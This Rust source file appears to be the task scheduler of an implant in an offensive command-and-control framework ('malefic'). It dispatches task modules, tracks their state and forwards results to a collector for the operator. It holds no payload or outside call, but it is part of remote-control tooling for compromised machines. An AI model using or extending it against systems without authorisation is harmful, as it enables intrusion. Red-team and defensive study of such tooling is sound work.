mod task;

use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
use futures::{select, FutureExt};
use futures::{SinkExt, StreamExt};
use futures_timer::Delay;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use crate::common::spawn;
use malefic_helper::debug;
use malefic_modules::{MaleficModule, TaskResult};
use malefic_proto::new_spite;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::Spite;
use task::{Task, TaskHandle, TaskManager};

pub enum TaskOperator {
    // AddTask(u32),
    CancelTask(u32),
    FinishTask(u32),
    QueryTask(u32),
    ListTask,
}

// 调度器结构体
pub struct Scheduler {
    manager: TaskManager,

    // 用于接收新Task任务
    task_sender: UnboundedSender<(bool, u32, Box<MaleficModule>, Body)>,
    task_receiver: UnboundedReceiver<(bool, u32, Box<MaleficModule>, Body)>,

    // 用于接收Task运行结果 这里的结果全立即发送给客户端
    _result_sender: UnboundedSender<TaskResult>,
    result_receiver: UnboundedReceiver<TaskResult>,

    // 管理module与task
    ctrl_sender: UnboundedSender<(u32, TaskOperator)>,
    ctrl_receiver: UnboundedReceiver<(u32, TaskOperator)>,

    // 向数据收集器发送数据
    data_sender: UnboundedSender<Spite>,
}

impl Scheduler {
    pub fn new(collector_data_sender: UnboundedSender<Spite>) -> Scheduler {
        let (_result_sender, result_receiver) = mpsc::unbounded();
        let (task_sender, task_receiver) = mpsc::unbounded();
        let (task_ctrl_sender, task_ctrl_receiver) = mpsc::unbounded();
        Scheduler {
            manager: TaskManager::new(),
            task_sender,
            task_receiver,
            _result_sender,
            result_receiver,
            ctrl_sender: task_ctrl_sender,
            ctrl_receiver: task_ctrl_receiver,
            data_sender: collector_data_sender,
        }
    }

    pub fn get_task_sender(&self) -> UnboundedSender<(bool, u32, Box<MaleficModule>, Body)> {
        self.task_sender.clone()
    }

    pub fn get_task_ctrl_sender(&self) -> UnboundedSender<(u32, TaskOperator)> {
        self.ctrl_sender.clone()
    }

    // 运行调度器
    pub async fn run(&mut self) -> Result<(), ()> {
        #[cfg(debug_assertions)]
        let _defer = malefic_helper::Defer::new("[scheduler] scheduler exit!");

        loop {
            select! {
                task_recv = self.task_receiver.next().fuse() => {
                    if let Some((is_async, id, module, body)) = task_recv {
                        if let Some(task_handle) = self.manager.tasks.get_mut(&id) {
                            if let Ok(mut task) = task_handle.task.lock() {
                                task.update_last();
                                task.recv_count += 1;
                                if task_handle.sender.send(body).await.is_ok() {
                                    debug!("[task] task {} send data", id);
                                    continue;
                                }
                            }
                        } else {
                            self.handle_task(is_async, id, module, body).await;
                        }
                    }
                },
                result_recv = self.result_receiver.next().fuse() => {
                    if let Some(result) = result_recv {
                        debug!("Scheduler receiver result: {:#?}", result);
                        let _ = self.data_sender.send(new_spite(result.task_id, String::new(), result.body)).await;
                    }
                },
                ctrl_recv = self.ctrl_receiver.next().fuse() => {
                    if let Some((tid, op)) = ctrl_recv {
                        match self.manager.do_operator(tid, op).await {
                            Ok(spite) => {
                                if let Some(spite) = spite {
                                    let _ = self.data_sender.send(spite).await;
                                }
                            },
                            Err(e) => {
                                debug!("Scheduler do_operator error: {}", e.to_string());
                            }
                        }
                    }
                }
            }
            Delay::new(Duration::from_nanos(1)).await;
        }
    }

    async fn handle_task(
        &mut self,
        _is_async: bool,
        id: u32,
        module: Box<MaleficModule>,
        body: Body,
    ) {
        let (task_data_sender, mut task_data_receiver) = mpsc::unbounded();
        let mut async_sender = self.data_sender.clone();
        let mut end_sender = self.get_task_ctrl_sender().clone();

        let handle = spawn(async move {
            let (mut body_sender, mut body_receiver) = mpsc::unbounded();
            let (mut result_sender, mut result_receiver) = mpsc::unbounded::<TaskResult>();

            let task = Arc::new(Mutex::new(Task::new(id)));
            let task_output = task.clone();
            let output_stream = spawn(async move {
                while let Some(result) = result_receiver.next().await {
                    if let Ok(mut task) = task_output.lock() {
                        task.send_count += 1;
                        task.update_last();
                    }
                    let _ = async_sender.send(result.to_spite()).await;
                }
            });

            let input_stream = spawn(async move {
                let _ = body_sender.send(body).await;
                while let Some(body) = task_data_receiver.next().await {
                    let _ = body_sender.send(body).await;
                }
            });

            let task_handle = Task::run(id, module, &mut body_receiver, &mut result_sender);

            select! {
                _ = input_stream.fuse() => {
                    debug!("[task] input_stream finished");
                }
                _ = output_stream.fuse() => {
                    debug!("[task] output_stream finished");
                },
                data = task_handle.fuse() => {
                    debug!("[task] task_handle finished");
                    match data {
                        Ok(result) => {
                            let _ = result_sender.send(result).await;
                        },
                        Err(e) => {
                            debug!("[task] {} error, {:#?}", id, e);
                            let _ = result_sender.send(TaskResult::new_with_error(id, e.into())).await;
                        }
                    }
                }
            }
            drop(result_sender);
            let _ = end_sender.send((0, TaskOperator::FinishTask(id))).await;
            debug!("[task] ending!");
        });

        let task = Arc::new(Mutex::new(Task::new(id)));
        self.manager.tasks.insert(
            id,
            TaskHandle {
                task,
                handle: Arc::new(Mutex::new(Some(handle))),
                sender: task_data_sender,
            },
        );
    }
}
